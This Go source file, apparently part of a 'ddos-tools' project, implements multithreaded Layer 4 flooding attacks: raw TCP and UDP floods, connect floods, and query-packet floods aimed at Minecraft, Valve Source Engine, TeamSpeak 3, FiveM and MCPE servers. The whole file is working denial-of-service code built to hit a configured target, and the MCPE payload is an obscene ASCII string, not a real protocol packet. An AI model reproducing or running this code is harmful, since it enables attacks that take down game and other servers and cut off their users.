package attacks

import (
	"encoding/binary"
	"fmt"
	"math/rand"
	"net"
	"sync"
	"time"

	"example.com/ddos-tools/pkg/minecraft"
	"example.com/ddos-tools/pkg/proxy"
	"example.com/ddos-tools/pkg/utils"
)

// Layer4Config holds configuration for Layer 4 attacks
type Layer4Config struct {
	Method     string
	Host       string
	Port       int
	Threads    int
	Duration   int
	Proxies    []proxy.Proxy
	Reflectors []string
	ProtocolID int
}

// RunLayer4Attack executes a Layer 4 attack
func RunLayer4Attack(cfg *Layer4Config, wg *sync.WaitGroup, stopChan chan struct{}, requestsSent, bytesSent *utils.Counter) {
	for i := range cfg.Threads {
		wg.Add(1)
		go func(threadID int) {
			defer wg.Done()

			for {
				select {
				case <-stopChan:
					return
				default:
					executeLayer4Method(cfg, requestsSent, bytesSent)
				}
			}
		}(i)
	}
}

func executeLayer4Method(cfg *Layer4Config, requestsSent, bytesSent *utils.Counter) {
	switch cfg.Method {
	case "TCP":
		executeTCP(cfg, requestsSent, bytesSent)
	case "UDP":
		executeUDP(cfg, requestsSent, bytesSent)
	case "SYN":
		executeSYN(cfg, requestsSent, bytesSent)
	case "MINECRAFT":
		executeMINECRAFT(cfg, requestsSent, bytesSent)
	case "VSE":
		executeVSE(cfg, requestsSent, bytesSent)
	case "TS3":
		executeTS3(cfg, requestsSent, bytesSent)
	case "FIVEM":
		executeFIVEM(cfg, requestsSent, bytesSent)
	case "FIVEM-TOKEN":
		executeFIVEMTOKEN(cfg, requestsSent, bytesSent)
	case "MCPE":
		executeMCPE(cfg, requestsSent, bytesSent)
	case "CPS":
		executeCPS(cfg, requestsSent, bytesSent)
	case "CONNECTION":
		executeCONNECTION(cfg, requestsSent, bytesSent)
	default:
		executeTCP(cfg, requestsSent, bytesSent)
	}
}

func executeTCP(cfg *Layer4Config, requestsSent, bytesSent *utils.Counter) {
	target := net.JoinHostPort(cfg.Host, fmt.Sprintf("%d", cfg.Port))
	conn, err := net.DialTimeout("tcp", target, 1*time.Second)
	if err != nil {
		return
	}
	defer conn.Close()

	data := utils.RandomBytes(1024)
	for {
		n, err := conn.Write(data)
		if err != nil {
			break
		}
		requestsSent.Add(1)
		bytesSent.Add(int64(n))
	}
}

func executeUDP(cfg *Layer4Config, requestsSent, bytesSent *utils.Counter) {
	target := net.JoinHostPort(cfg.Host, fmt.Sprintf("%d", cfg.Port))
	addr, err := net.ResolveUDPAddr("udp", target)
	if err != nil {
		return
	}

	conn, err := net.DialUDP("udp", nil, addr)
	if err != nil {
		return
	}
	defer conn.Close()

	data := utils.RandomBytes(1024)
	for range 100 {
		n, err := conn.Write(data)
		if err != nil {
			break
		}
		requestsSent.Add(1)
		bytesSent.Add(int64(n))
	}
}

func executeSYN(cfg *Layer4Config, requestsSent, bytesSent *utils.Counter) {
	// SYN flood requires raw sockets which need root/admin privileges
	// This is a simplified version
	target := net.JoinHostPort(cfg.Host, fmt.Sprintf("%d", cfg.Port))
	for range 10 {
		conn, err := net.DialTimeout("tcp", target, 100*time.Millisecond)
		if err == nil {
			conn.Close()
			requestsSent.Add(1)
		}
	}
}

func executeMINECRAFT(cfg *Layer4Config, requestsSent, bytesSent *utils.Counter) {
	target := net.JoinHostPort(cfg.Host, fmt.Sprintf("%d", cfg.Port))
	conn, err := net.DialTimeout("tcp", target, 1*time.Second)
	if err != nil {
		return
	}
	defer conn.Close()

	handshake := minecraft.Handshake(cfg.Host, uint16(cfg.Port), cfg.ProtocolID, 1)
	ping := minecraft.Data([]byte{0x00})

	for {
		n1, err := conn.Write(handshake)
		if err != nil {
			break
		}
		n2, err := conn.Write(ping)
		if err != nil {
			break
		}
		requestsSent.Add(1)
		bytesSent.Add(int64(n1 + n2))
	}
}

func executeVSE(cfg *Layer4Config, requestsSent, bytesSent *utils.Counter) {
	target := net.JoinHostPort(cfg.Host, fmt.Sprintf("%d", cfg.Port))
	addr, err := net.ResolveUDPAddr("udp", target)
	if err != nil {
		return
	}

	conn, err := net.DialUDP("udp", nil, addr)
	if err != nil {
		return
	}
	defer conn.Close()

	// VSE (Valve Source Engine) query packet
	payload := []byte{
		0xff, 0xff, 0xff, 0xff, 0x54, 0x53, 0x6f, 0x75,
		0x72, 0x63, 0x65, 0x20, 0x45, 0x6e, 0x67, 0x69,
		0x6e, 0x65, 0x20, 0x51, 0x75, 0x65, 0x72, 0x79, 0x00,
	}

	for range 100 {
		n, err := conn.Write(payload)
		if err != nil {
			break
		}
		requestsSent.Add(1)
		bytesSent.Add(int64(n))
	}
}

func executeTS3(cfg *Layer4Config, requestsSent, bytesSent *utils.Counter) {
	target := net.JoinHostPort(cfg.Host, fmt.Sprintf("%d", cfg.Port))
	addr, err := net.ResolveUDPAddr("udp", target)
	if err != nil {
		return
	}

	conn, err := net.DialUDP("udp", nil, addr)
	if err != nil {
		return
	}
	defer conn.Close()

	// TS3 (TeamSpeak 3) query packet
	payload := []byte{
		0x05, 0xca, 0x7f, 0x16, 0x9c, 0x11, 0xf9, 0x89,
		0x00, 0x00, 0x00, 0x00, 0x02,
	}

	for range 100 {
		n, err := conn.Write(payload)
		if err != nil {
			break
		}
		requestsSent.Add(1)
		bytesSent.Add(int64(n))
	}
}

func executeFIVEM(cfg *Layer4Config, requestsSent, bytesSent *utils.Counter) {
	target := net.JoinHostPort(cfg.Host, fmt.Sprintf("%d", cfg.Port))
	addr, err := net.ResolveUDPAddr("udp", target)
	if err != nil {
		return
	}

	conn, err := net.DialUDP("udp", nil, addr)
	if err != nil {
		return
	}
	defer conn.Close()

	// FiveM query packet
	payload := []byte{0xff, 0xff, 0xff, 0xff, 'g', 'e', 't', 'i', 'n', 'f', 'o', ' ', 'x', 'x', 'x', 0x00, 0x00, 0x00}

	for range 100 {
		n, err := conn.Write(payload)
		if err != nil {
			break
		}
		requestsSent.Add(1)
		bytesSent.Add(int64(n))
	}
}

func executeFIVEMTOKEN(cfg *Layer4Config, requestsSent, bytesSent *utils.Counter) {
	target := net.JoinHostPort(cfg.Host, fmt.Sprintf("%d", cfg.Port))
	addr, err := net.ResolveUDPAddr("udp", target)
	if err != nil {
		return
	}

	conn, err := net.DialUDP("udp", nil, addr)
	if err != nil {
		return
	}
	defer conn.Close()

	for range 100 {
		token := fmt.Sprintf("%s-%s-%s-%s",
			utils.RandString(8),
			utils.RandString(4),
			utils.RandString(4),
			utils.RandString(12))
		guid := fmt.Sprintf("%d", 76561197960265728+rand.Int63n(39734735271))

		payload := fmt.Sprintf("token=%s&guid=%s", token, guid)
		n, err := conn.Write([]byte(payload))
		if err != nil {
			break
		}
		requestsSent.Add(1)
		bytesSent.Add(int64(n))
	}
}

func executeMCPE(cfg *Layer4Config, requestsSent, bytesSent *utils.Counter) {
	target := net.JoinHostPort(cfg.Host, fmt.Sprintf("%d", cfg.Port))
	addr, err := net.ResolveUDPAddr("udp", target)
	if err != nil {
		return
	}

	conn, err := net.DialUDP("udp", nil, addr)
	if err != nil {
		return
	}
	defer conn.Close()

	// MCPE (Minecraft Pocket Edition) packet
	payload := []byte{
		0x61, 0x74, 0x6f, 0x6d, 0x20, 0x64, 0x61, 0x74,
		0x61, 0x20, 0x6f, 0x6e, 0x74, 0x6f, 0x70, 0x20,
		0x6d, 0x79, 0x20, 0x6f, 0x77, 0x6e, 0x20, 0x61,
		0x73, 0x73, 0x20, 0x61, 0x6d, 0x70, 0x2f, 0x74,
		0x72, 0x69, 0x70, 0x68, 0x65, 0x6e, 0x74, 0x20,
		0x69, 0x73, 0x20, 0x6d, 0x79, 0x20, 0x64, 0x69,
		0x63, 0x6b, 0x20, 0x61, 0x6e, 0x64, 0x20, 0x62,
		0x61, 0x6c, 0x6c, 0x73,
	}

	for range 100 {
		n, err := conn.Write(payload)
		if err != nil {
			break
		}
		requestsSent.Add(1)
		bytesSent.Add(int64(n))
	}
}

func executeCPS(cfg *Layer4Config, requestsSent, bytesSent *utils.Counter) {
	target := net.JoinHostPort(cfg.Host, fmt.Sprintf("%d", cfg.Port))
	for range 10 {
		conn, err := net.DialTimeout("tcp", target, 1*time.Second)
		if err == nil {
			conn.Close()
			requestsSent.Add(1)
		}
	}
}

func executeCONNECTION(cfg *Layer4Config, requestsSent, bytesSent *utils.Counter) {
	target := net.JoinHostPort(cfg.Host, fmt.Sprintf("%d", cfg.Port))
	conn, err := net.DialTimeout("tcp", target, 1*time.Second)
	if err != nil {
		return
	}

	go func() {
		defer conn.Close()
		buf := make([]byte, 1024)
		for {
			_, err := conn.Read(buf)
			if err != nil {
				break
			}
		}
	}()

	requestsSent.Add(1)
	time.Sleep(5 * time.Second)
}

// Helper function to create TCP checksum
func tcpChecksum(data []byte) uint16 {
	sum := uint32(0)
	for i := range len(data) - 1 {
		if i%2 != 0 {
			continue
		}
		sum += uint32(binary.BigEndian.Uint16(data[i : i+2]))
	}
	if len(data)%2 != 0 {
		sum += uint32(data[len(data)-1]) << 8
	}
	sum = (sum >> 16) + (sum & 0xffff)
	sum = sum + (sum >> 16)
	return uint16(^sum)
}
